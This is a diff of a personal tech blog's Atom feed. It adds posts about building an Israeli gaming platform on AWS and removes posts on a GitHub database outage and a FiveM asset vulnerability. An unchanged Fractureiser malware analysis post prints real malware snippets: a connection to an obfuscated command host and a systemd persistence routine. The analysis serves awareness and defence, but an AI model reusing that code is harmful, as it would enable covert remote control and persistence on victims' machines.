@@ -3,12 +3,210 @@
     <title>DF Blogs</title>
     <link href="https://blog.thefourcraft.com/feed.xml" rel="self" />
     <link href="https://blog.thefourcraft.com" />
-    <updated>2023-06-25T19:30:42+03:00</updated>
+    <updated>2023-07-01T22:41:45+03:00</updated>
     <author>
         <name>thefourCraft</name>
     </author>
     <id>https://blog.thefourcraft.com</id>
 
+    <entry>
+        <title>How Does גיימינג.ישראל Work?</title>
+        <author>
+            <name>thefourCraft</name>
+        </author>
+        <link href="https://blog.thefourcraft.com/how-dose-gaming-israel-work/index.html"/>
+        <id>https://blog.thefourcraft.com/how-dose-gaming-israel-work/index.html</id>
+        <media:content url="https://blog.thefourcraft.com/media/posts/55/How-Does-gyymyng-yshrl-Work.png" medium="image" />
+            <category term="גיימינג.ישראל"/>
+            <category term="Servers"/>
+            <category term="IMS - Network"/>
+            <category term="Gaming"/>
+            <category term="AWS"/>
+
+        <updated>2023-07-01T22:41:45+03:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://blog.thefourcraft.com/media/posts/55/How-Does-gyymyng-yshrl-Work.png" alt="" />
+                    <p>Embark on a gaming revolution in Israel as I unveil how I built a cutting-edge platform revolutionizing gaming in Israel!</p>
+
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://blog.thefourcraft.com/media/posts/55/How-Does-gyymyng-yshrl-Work.png" class="type:primaryImage" alt="" /></p>
+                <p>Embark on a gaming revolution in Israel as I unveil how I built a cutting-edge platform revolutionizing gaming in Israel!</p>
+
+<h2>About IMS - Network's infrastructure</h2>
+<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
+<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
+<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark">
+<p>As the CTO at <a href="https://ims-network.org" target="_blank" rel="sponsored noopener noreferrer">IMS - Network</a>, I have spearheaded implementing a robust hybrid multi-cloud solution for our applications and services. Our infrastructure strategy combines utilizing major cloud providers with managing two physical server farms in Israel. By adopting this approach, our primary objective is to optimize costs and achieve cost savings. We evaluate the most cost-effective options for each application or platform we develop or host. This approach allows us to leverage the advantages of cloud services while maintaining control over specific resources, ensuring flexibility, reliability, and cost efficiency for our organization.</p>
+<h2>Why Did I Choose AWS For This Platform</h2>
+<p>When I initially started developing "גיימינג.ישראל," it was a simple Docker application running on my local PC. Initially, I built the platform from scratch using the <a href="https://Frappeframework.com" target="_blank" rel="noopener noreferrer">Frappe framework</a>. While Frappe is a fantastic framework to work with, I soon realized that this approach would be time-consuming and require significant effort. After two months of development, I decided to transition to <a href="https://WordPress.org" target="_blank" rel="noopener noreferrer">WordPress</a>. WordPress is a well-known platform with extensive documentation, an active community, and a robust foundation.</p>
+<p>The shift to AWS came when we at IMS - Network began migrating applications from our self-hosted servers to the cloud. The primary goal was to free up space on our servers to accommodate gaming servers, as low ping is a critical factor for gamers. <br>We recognized that AWS offered a comprehensive suite of services, scalability, reliability, and the ability to optimize costs. </p>
+<p>Ultimately, the choice to utilize AWS for "גיימינג.ישראל" was driven by the need for a scalable and reliable platform, and the desire to streamline development efforts.</p>
+<h2>Infrastructure Setup</h2>
+<p>Our infrastructure consists of several vital services within the AWS environment. Here are details about the services we utilize:</p>
+<figure class="post__image" ><figure class="post__image post__image--wide"><img loading="lazy"  src="https://blog.thefourcraft.com/media/posts/55/Gaming-Israel-Wordpress-Network-1.png" alt="Cloudcraft 3D diagram of the infrastructure" width="3840" height="2160" sizes="(max-width: 48em) 100vw, 768px" srcset="https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-xs.png 300w ,https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-sm.png 480w ,https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-md.png 768w"></figure>
+<figcaption >Cloudcraft 3D diagram of the infrastructure</figcaption>
+</figure>
+<h3>EC2 – Automatic Scaling and System Operations</h3>
+<p>Our system operates on two EC2 instances that host our platform. With the automatic scaling feature of EC2, we can dynamically adjust our resources in response to changes in system load. This capability allows us to efficiently handle varying workloads and maintain optimal availability and performance for our users.</p>
+<p>When the demand for our system increases, EC2 automatically scales up our resources by adding more instances to handle the workload effectively. Likewise, during periods of lower demand, EC2 scales down our resources by removing instances, optimizing cost efficiency.</p>
+<h3>S3 – Daily Image Backup</h3>
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark">
+<p>We have implemented the S3 (Simple Storage Service) as our backup solution to safeguard our valuable images. Through S3, we store and protect our images in a secure and easily accessible manner. This approach ensures that our images are reliably backed up and can be swiftly recovered in the event of data loss or system failure. By leveraging S3's durability and redundancy features, we maintain the integrity of our image data, guaranteeing that important visual content is preserved and readily available whenever needed.</p>
+</div>
+</div>
+</div>
+<h3>SES – Email Delivery</h3>
+<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
+<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
+<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark">
+<p>To streamline communication within our system, we rely on the SES (Simple Email Service) provided by Amazon for efficient email delivery. By leveraging SES, we can automate the process of sending emails and notifications to users within our system. This service serves as a reliable and swift communication channel, enabling us to effectively deliver important information and timely updates to our users. With SES, we ensure that our users receive essential messages promptly and dependably, facilitating seamless and effective communication throughout our platform.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<h3>API Gateway and Custom API</h3>
+<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
+<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
+<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark">
+<p>We have integrated the API Gateway service into our infrastructure to effectively manage both the WordPress API and our unique platform API. API Gateway is vital in securely handling communication with the APIs, ensuring easy administration and maintenance. This service provides a centralized control point for our APIs, allowing us to manage access, authentication, and rate limiting efficiently. Moreover, API Gateway empowers us to develop external applications that can seamlessly interact with our system through the custom API, fostering integrations and extending the functionality of our platform.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<h3>RDS and MySQL Database</h3>
+<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
+<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
+<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark">
+<p>Within our infrastructure, we have integrated the RDS (Relational Database Service) offered by AWS, with MySQL serving as the primary database for our WordPress-based system. By utilizing RDS, we benefit from a fully managed database solution, enabling us to dedicate our resources to developing and maintaining our application without concern with setting up central server infrastructures or managing the database locally. RDS provides a reliable and scalable foundation for our database needs, ensuring optimal performance and streamlined management.</p>
+<h3>EOF</h3>
+<p>In general, the combination of AWS infrastructure and WordPress allowed me to build גיימינג.ישראל and make it work :)  </p>
+<h4>Why won't you go multi-region in case Frankfurt won't be available?</h4>
+<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
+<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
+<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark">
+<p>Well, here's a light-hearted response with a DevOps joke:</p>
+<p>"Why won't you go multi-region in case Frankfurt won't be available? Because our budget is more single-region than multi-million!"</p>
+<p>In the world of DevOps, multi-region setups are often considered the gold standard for high availability and disaster recovery. However, implementing such a setup can be costly and resource-intensive. So, while the idea of going multi-region might be appealing, sometimes the budget constraints make it a challenging endeavor. But hey, we can always dream of a day when our pockets are as vast as our infrastructure!</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>I Created Ultimate Hub for Gaming In Israel</title>
+        <author>
+            <name>thefourCraft</name>
+        </author>
+        <link href="https://blog.thefourcraft.com/i-created-ultimate-hub-for-gaming-in-israel/index.html"/>
+        <id>https://blog.thefourcraft.com/i-created-ultimate-hub-for-gaming-in-israel/index.html</id>
+        <media:content url="https://blog.thefourcraft.com/media/posts/54/I-Created-Ultimate-Hub-for-Gaming-In-Israel.png" medium="image" />
+            <category term="Servers"/>
+            <category term="IMS - Network"/>
+            <category term="Gaming"/>
+            <category term="AWS"/>
+
+        <updated>2023-07-01T20:43:53+03:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://blog.thefourcraft.com/media/posts/54/I-Created-Ultimate-Hub-for-Gaming-In-Israel.png" alt="" />
+                    <p>Welcome to <a href="https://גיימינג.ישראל" target="_blank" rel="sponsored noopener noreferrer">גיימינג.ישראל</a>, the premier gaming center and marketplace for gamers in Israel. Join diverse communities, find assistance for your projects, and share your creations with fellow gamers. Let's unite and embrace the world of gaming together!</p>
+
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://blog.thefourcraft.com/media/posts/54/I-Created-Ultimate-Hub-for-Gaming-In-Israel.png" class="type:primaryImage" alt="" /></p>
+                <p>Welcome to <a href="https://גיימינג.ישראל" target="_blank" rel="sponsored noopener noreferrer">גיימינג.ישראל</a>, the premier gaming center and marketplace for gamers in Israel. Join diverse communities, find assistance for your projects, and share your creations with fellow gamers. Let's unite and embrace the world of gaming together!</p>
+
+<h2>Discover a Thriving Gaming Community</h2>
+<p>At <a href="https://גיימינג.ישראל" target="_blank" rel="sponsored noopener noreferrer">גיימינג.ישראל</a>, we believe in the power of community.<br>Connect with like-minded gamers, engage in lively discussions, and exchange valuable insights. My platform fosters a vibrant and inclusive space where gamers of all backgrounds come together to celebrate their passion for gaming.</p>
+<h2>List Your Gaming Servers and More</h2>
+<p>Are you looking to showcase your multiplayer game? Look no further. <a href="https://גיימינג.ישראל" target="_blank" rel="sponsored noopener noreferrer">גיימינג.ישראל</a> provides a comprehensive platform for users to list their gaming servers and attract fellow gamers. Whether you're a developer, a community leader, or a gaming enthusiast, my platform offers the ideal avenue to reach your target audience and build a thriving gaming community.</p>
+<h2>Hold On... How's The Domain Name In Hebrew!?</h2>
+<p>The new Country Code top-level domain (ccTLD) .ישראל is launched! On November 22, 2022, the Israel Internet Association (ISOC-IL) started offering the public the option to register Hebrew domain names under a new national TLD – .ישראל. Now, Israelis have two available TLDs: ישראל and .il.</p>
+<p>Notably, while the ability to register a .ישראל domain is exciting, it's important to note that not all web apps and online services may support it initially. ISOC-IL is actively working to expand the support for the new TLD in various apps and platforms. Still, this process will take time due to the many browsers, messaging apps, online services, and email apps available.</p>
+<h3>How do non-Latin domain names work?</h3>
+<p>Domain names in Hebrew (and other languages) utilize a set of standards called IDN (Internationalized Domain Names). Hebrew domain names are translated into strings containing Latin letters, numbers, and hyphens, decoded by the domain name system (DNS). For example, the domain name "גיימינג.ישראל" is represented as "xn--6dbauaa3ap.xn--4dbrk0ce". While many browsers already support IDN standards, email software, and other applications still adopt them.</p>
+<h3>Wait... How Did You Manage To Acquire The Domain Name "gaming.Israel"</h3>
+<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
+<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
+<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark"> </div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
+<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto">
+<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
+<div class="flex flex-grow flex-col gap-3">
+<div class="min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4">
+<div class="markdown prose w-full break-words dark:prose-invert dark">
+<p>You may have noticed that "גיימינג.ישראל" translates to "gaming.Israel," which is a precious domain, similar to domains like gaming.com or apple.com. Acquiring such a domain requires registering during the sunrise period:</p>
+<h4>What is the sunrise period for a new gTLD?</h4>
+<p>When a new gTLD is launched, a <strong>sunrise period of at least 30 days is required before domain names are offered to the general public</strong> During the Sunrise period, you can register a domain name for 1 to 10 years, depending on the registry rules</p>
+<h4>So How Did I Buy "גיימינג.ישראל"</h4>
+<p>During the sunrise period, many large enterprises typically reserve their domains. However, individuals and organizations also seek unique names to purchase for future use. The same held true for the new gTLD domain, .ישראל.</p>
+<p>When I first heard about the new gTLD, I was eager to acquire "גיימינג.ישראל" right from the start. Without hesitation, I promptly approached a verified domain registrar and engaged in a bidding war with one of the prominent telecommunication providers in Israel. After numerous rounds of bidding, I emerged victorious! 😈</p>
+<h2>About The "גיימינג.ישראל" Platform</h2>
+<p>The motivation behind creating the "גיימינג.ישראל" platform stemmed from a desire to address several challenges faced by the Israeli gaming community. As a player and a gaming community owner, I noticed that the community was fragmented due to the lack of a centralized platform where players could quickly discover and join various gaming communities in Israel.</p>
+<p>Existing server lists in other countries often proved to be complicated to navigate, had poor design, or lacked adequate security measures. Additionally, many Israeli gamers resorted to seeking gaming communities in the US or EU due to the absence of a comprehensive platform in Israel. However, the major obstacle they faced was the issue of high ping, which negatively impacted their gaming experience when playing on servers located far away.</p>
+<p>With the "גיימינג.ישראל" platform, I aimed to provide a solution that would address these challenges and unite the Israeli gaming community. Players can easily find and join gaming servers within Israel by offering a user-friendly and secure platform. This enhances the gaming experience and fosters a stronger sense of community among Israeli gamers.</p>
+<p>Through "גיימינג.ישראל," gamers can discover a wide range of local gaming communities, connect with fellow players, and engage in thrilling adventures unique to Israel. By eliminating the ping issue associated with distant servers, the platform enables Israeli gamers to embrace and enjoy gaming experiences within their own country fully.</p>
+<p>The vision behind "גיימינג.ישראל" is to create a vibrant and unified gaming ecosystem in Israel, where players can effortlessly explore, connect, and collaborate. Together, we can build a strong and thriving gaming community that showcases the talent and creativity of Israeli gamers to the world. Join us on "גיימינג.ישראל" and unlock the full potential of gaming in Israel!</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>The Devastating Fractureiser: Minecraft&#x27;s Malware Outbreak</title>
         <author>
@@ -21,7 +219,7 @@
             <category term="Malware"/>
             <category term="Fractureiser"/>
 
-        <updated>2023-06-25T19:30:42+03:00</updated>
+        <updated>2023-06-28T18:12:19+03:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png" alt="" />
@@ -47,7 +245,7 @@
 <p>The impact of the Fractureiser malware has been significant, with several mods being infected and taken down permanently <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-6" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. The malware has also infected several Bukkit plugins <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-7" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>. At the time of detection, the total non-unique downloads for some of the infected mods and plugins were in the hundreds, indicating the widespread nature of the infection <sup><a href="https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/" id="user-content-fnref-4%5E-8" data-footnote-ref="true" aria-describedby="footnote-label" target="_new">2</a></sup>.</p>
 <p>The following code snippets are from the Fractureiser malware and provide insight into how it operates:</p>
 <p>This snippet shows how the malware connects to a host via an encoded URL:</p>
-<p><code>HttpURLConnection var2 = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode("aHR0cDovL2ZpbGVzLnNreXJhZ2UuZGUvdXBkYXRl")))).openConnection();</code></p>
+<pre><code>HttpURLConnection var2 = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode("aHR0cDovL2ZpbGVzLnNreXJhZ2UuZGUvdXBkYXRl")))).openConnection();</code></pre>
 <p>The malware connects to a host using an encoded URL. The URL is decoded from Base64 format and then used to open a connection. This method allows the malware to hide the URL it connects to, making it harder for security systems to detect and block it.</p>
 <p>This snippet shows how the malware sets itself up for continued access:</p>
 <pre>var0 = new File("/bin/vmd-gnu");<br>File var1 = new File("/etc/systemd/system/vmd-gnu.service");<br>String var2 = "[Unit]\\nDescription=vmd-gnu local service\\nAfter=network.target\\nStartLimitIntervalSec=0\\n\\n[Service]\\nType=simple\\nRestart=always\\nRestartSec=1\\nUser=" + System.getProperty("user.name") + "\\nExecStart=/bin/sh -c \\\"java -Dauto=true -jar /bin/vmd-gnu\\\"\\n\\n[Install]\\nWantedBy=multi-user.target";<br>URL var3 = O.class.getProtectionDomain().getCodeSource().getLocation();<br>Files.copy((new File(var3.getFile())).toPath(), var0.toPath(), StandardCopyOption.REPLACE_EXISTING);<br>Files.write(var1.toPath(), var2.getBytes(), new OpenOption[0]);<br>Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl enable vmd-gnu"}).waitFor();<br>Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl start vmd-gnu"}).waitFor();</pre>
@@ -594,204 +792,6 @@ SQL injection can be used to manipulate a standard SQL query to exploit non-vali
 <li>Download <a href="https://hackmd.io/B46EYzKXSfWSF35DeCZz9A" target="_new">Windows Script</a></li>
 <li>Download <a href="https://hackmd.io/B46EYzKXSfWSF35DeCZz9A" target="_new">Linux Script</a></li>
 </ul>
-<p> </p>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>How GitHub&#x27;s Database Self-Destructed in 43 Seconds</title>
-        <author>
-            <name>thefourCraft</name>
-        </author>
-        <link href="https://blog.thefourcraft.com/how-to-try-to-be-a-good-decsecops-engineer/index.html"/>
-        <id>https://blog.thefourcraft.com/how-to-try-to-be-a-good-decsecops-engineer/index.html</id>
-        <media:content url="https://blog.thefourcraft.com/media/posts/45/How-GitHubs-Database-Self-Destructed-in-43-Seconds.png" medium="image" />
-            <category term="MySQL"/>
-            <category term="GitHub"/>
-            <category term="Documentary"/>
-            <category term="DevOps"/>
-            <category term="Database"/>
-
-        <updated>2023-06-16T14:09:23+03:00</updated>
-            <summary>
-                <![CDATA[
-                        <img src="https://blog.thefourcraft.com/media/posts/45/How-GitHubs-Database-Self-Destructed-in-43-Seconds.png" alt="" />
-                    <p>On October 21st, 2018, GitHub, the world's leading software development platform, experienced a significant operational mishap. During routine maintenance work on their East Coast network, connectivity to a hub was severed, creating a network partition between the East Coast data center and everything else. This incident led to GitHub losing half of its servers. Although the maintenance crew restored the connection in 43 seconds, GitHub experienced an additional 24 hours of service degradation. Users couldn't log in, stale data was served, and the website was read-only.</p>
-
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                    <p><img src="https://blog.thefourcraft.com/media/posts/45/How-GitHubs-Database-Self-Destructed-in-43-Seconds.png" class="type:primaryImage" alt="" /></p>
-                <p>On October 21st, 2018, GitHub, the world's leading software development platform, experienced a significant operational mishap. During routine maintenance work on their East Coast network, connectivity to a hub was severed, creating a network partition between the East Coast data center and everything else. This incident led to GitHub losing half of its servers. Although the maintenance crew restored the connection in 43 seconds, GitHub experienced an additional 24 hours of service degradation. Users couldn't log in, stale data was served, and the website was read-only.</p>
-
-<h2>The Architecture of GitHub's Database</h2>
-<p>GitHub stores all its metadata, such as issues, pull requests, comments, notifications, and actions, in MySQL. They use a standard primary replica setup where writes go to the primary, replicating one or more read replicas. This setup improves read throughput and availability as reads can be distributed throughout all replicas, and if the primary fails, a fellow replica can be promoted to take its place.</p>
-<p>GitHub has many services and features, and to maintain separation of concerns, this requires many database clusters, each having its designated primary. All primaries were in the East Coast data center, with replicas spread across both coasts. Specific replicas in the West functioned as intermediate primaries, or in other words. A replica can have replicas that can have more replicas. This may seem overcomplicated, but there are a few advantages here. In terms of cost, a single replication layer means a lot of cross-data center traffic which is very expensive. With an intermediate primary, the cross-data center hop is only performed once. They also reduce the load on the primary as it only replicates to its descendants.</p>
-<h2>The Role of Orchestrator</h2>
-<p>GitHub has a homegrown tool to manage all of this called <a href="https://github.blog/2016-12-08-orchestrator-github/" target="_blank" rel="noopener noreferrer">Orchestrator</a>, which comes with a UI to help visualize and manage database topologies. Most importantly, though, it supports automatic primary failover; the primary orchestrator in a database system will automatically failover and promote a new primary within 30 seconds if it detects that replicas cannot contact the primary. However, if the orchestrator is not configured carefully, it can implement topologies the application does not support.</p>
-<h2>The Incident and Its Aftermath</h2>
-<p>In the specific incident, replication lag caused data to be present in the East Coast clusters but not in the West Coast and writes timed out and failed for a few seconds. Orchestrator nodes in the West Coast and US East cloud established quorum to fail over since the primaries were unreachable to both orchestrator and replicas. Replicas in the US West database were promoted as the new primaries, and write traffic was restored. The East and West Coast databases contained unique writes not present in the other, causing inconsistencies after restoring the connection.</p>
-<p>The engineers at GitHub were facing issues with the cross-country latency of their database services, making the website unusable for many users. They were stuck between a rock and a hard place, as reversing the situation would require removing the West Coast from service, which would cause data loss for many users. Some engineers believed failing back was the correct option, but others disagreed, stating that data integrity was paramount.</p>
-<h2>The Recovery Process</h2>
-<p>Eventually, GitHub prioritized data integrity over the speed of recovery and site usability, turning off certain features to prevent further database impact and drafting a plan. The plan was to fail forward and continue with U.S West as the primary until the East Coast clusters were fully synchronized. The East Coast required a restore from backup, and the engineers saved the unreplicated writes to reconcile later.</p>
-<p>The recovery process took longer than expected, and the estimated time for recovery was off due to a miscalculation. The outage also caused a backlog of webhooks and page builds to process, which took some time to clear. Despite trying to avoid such situations, things sometimes don't work out as expected. GitHub experienced a seven-hour outage due to a maintenance mishap but restored normal operations and updated the site status to green.</p>
-<h2>Lessons Learned and Future Initiatives</h2>
-<p>The incident led to a rethinking of the capabilities of the orchestrator and the establishment of a crisper and more transparent reporting mechanism. The long-term goal is to allow the application to tolerate a complete failure of a single data center without impact.</p>
-<p>GitHub's architecture is more mature than many of its competitors, but with grand scale comes excellent complexity. The incident served as a stark reminder of the challenges of managing large-scale, distributed systems. It also highlighted the importance of robust disaster recovery plans and the need for systems to be designed to handle unexpected failures gracefully.</p>
-<p>In conclusion, the incident at GitHub was a significant event in software development and database management. It was a valuable lesson for other organizations about the importance of robust, resilient systems and the potential pitfalls of managing large-scale, distributed databases. It also underscored the importance of prioritizing data integrity over the speed of recovery, even in the face of significant service degradation.</p>
-<h2>Sources</h2>
-<ul>
-<li><a href="https://www.youtube.com/watch?v=dsHyUgGMht0" target="_new">How GitHub's Database Self-Destructed in 43 Seconds - YouTube</a><br><a href="https://github.blog/2018-10-30-oct21-post-incident-analysis/" target="_new"></a></li>
-<li><a href="https://github.blog/2018-10-30-oct21-post-incident-analysis/" target="_new">October 21 Post Incident Analysis - GitHub Blog</a><br><a href="https://github.blog/2016-12-08-orchestrator-github/" target="_new"></a></li>
-<li><a href="https://github.blog/2016-12-08-orchestrator-github/" target="_new">Orchestrator at GitHub - GitHub Blog</a><br><a href="https://github.blog/2018-06-20-mysql-high-availability-at-github/" target="_new"></a></li>
-<li><a href="https://github.blog/2018-06-20-mysql-high-availability-at-github/" target="_new">MySQL High Availability at GitHub - GitHub Blog</a><br><a href="https://news.ycombinator.com/item?id=18272928" target="_new"></a></li>
-<li><a href="https://news.ycombinator.com/item?id=18272928" target="_new">Discussion on Hacker News</a><br><a href="https://www.reddit.com/r/programming/comments/9q94am/github_major_service_outage/" target="_new"></a></li>
-<li><a href="https://www.reddit.com/r/programming/comments/9q94am/github_major_service_outage/" target="_new">Discussion on Reddit</a><br><a href="https://hub.packtpub.com/github-down-for-over-7-hours-due-to-failure-in-its-data-storage-system/" target="_new"></a></li>
-<li><a href="https://hub.packtpub.com/github-down-for-over-7-hours-due-to-failure-in-its-data-storage-system/" target="_new">GitHub Down for Over 7 Hours Due to Failure in Its Data Storage System - Packt </a><a href="https://hub.packtpub.com/github-down-for-over-7-hours-due-to-failure-in-its-data-storage-system/" target="_new">Hub</a><br><a href="https://github.blog/2017-10-12-evolution-of-our-data-centers/" target="_new"></a></li>
-<li><a href="https://github.blog/2017-10-12-evolution-of-our-data-centers/" target="_new">Evolution of Our Data Centers - GitHub Blog</a><br><a href="https://www.githubstatus.com/history?page=19" target="_new"></a></li>
-<li><a href="https://www.githubstatus.com/history?page=19" target="_new">GitHub Status History</a></li>
-</ul>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>FiveM&#x27;s Granted Assets Security Backdoor </title>
-        <author>
-            <name>thefourCraft</name>
-        </author>
-        <link href="https://blog.thefourcraft.com/fivems-granted-assets-security-backdoor/index.html"/>
-        <id>https://blog.thefourcraft.com/fivems-granted-assets-security-backdoor/index.html</id>
-        <media:content url="https://blog.thefourcraft.com/media/posts/44/FiveMs-Granted-Assets-Security-Backdoor.png" medium="image" />
-            <category term="Security"/>
-            <category term="FiveM"/>
-            <category term="Cloud Security"/>
-            <category term="AWS"/>
-
-        <updated>2023-05-14T02:34:51+03:00</updated>
-            <summary>
-                <![CDATA[
-                        <img src="https://blog.thefourcraft.com/media/posts/44/FiveMs-Granted-Assets-Security-Backdoor.png" alt="" />
-                    I have discovered a vulnerability within FiveM's content.cfx.re/assets system that allows unauthorized individuals to download content without needing authentication or&hellip;
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                    <p><img src="https://blog.thefourcraft.com/media/posts/44/FiveMs-Granted-Assets-Security-Backdoor.png" class="type:primaryImage" alt="" /></p>
-                <p>I have discovered a vulnerability within FiveM's content.cfx.re/assets system that allows unauthorized individuals to download content without needing authentication or being connected to cfx.re. This security flaw raises significant concerns about the platform's integrity and user data protection. I have made multiple attempts to communicate this issue to the FiveM team, but unfortunately, my efforts were ignored, leading me to disclose this vulnerability publicly.</p>
-<p class="msg msg--warning">I hesitated to publish this blog post, as I encountered difficulties communicating with the FiveM or cfx.re team, who unfortunately chose to ignore me and blacklist me from their GitHub. Despite my persistent effort to establish contact, I have made my report and findings public.</p>
-<h2>What is FiveM?</h2>
-<p>FiveM is a modification framework for the famous Grand Theft Auto V (GTA V), developed by Rockstar Games. FiveM allows users to create and customize their own multiplayer experiences within the game, separate from the official GTA Online multiplayer mode.</p>
-<p>With FiveM, players can create their dedicated servers and modify various aspects of the game, including adding new maps, vehicles, scripts, and game modes. It provides a platform for developers to build and share their custom multiplayer game modes, role-playing servers, and other creative content.</p>
-<p>FiveM is widely used for role-playing servers. These role-playing servers often have rules and communities, offering a unique multiplayer experience. Players take on different roles and engage in activities such as police enforcement, emergency services, criminal enterprises, or simply interacting with other players in a virtual world.</p>
-<p>It's worth noting that FiveM is a third-party modification and operates separately from the official GTA Online servers. It is not endorsed or supported by Rockstar Games. Still, it has gained significant popularity among the GTA V community due to its versatility and ability to create customized multiplayer environments.</p>
-<h2>About the FiveM Asset Escrow Protection System</h2>
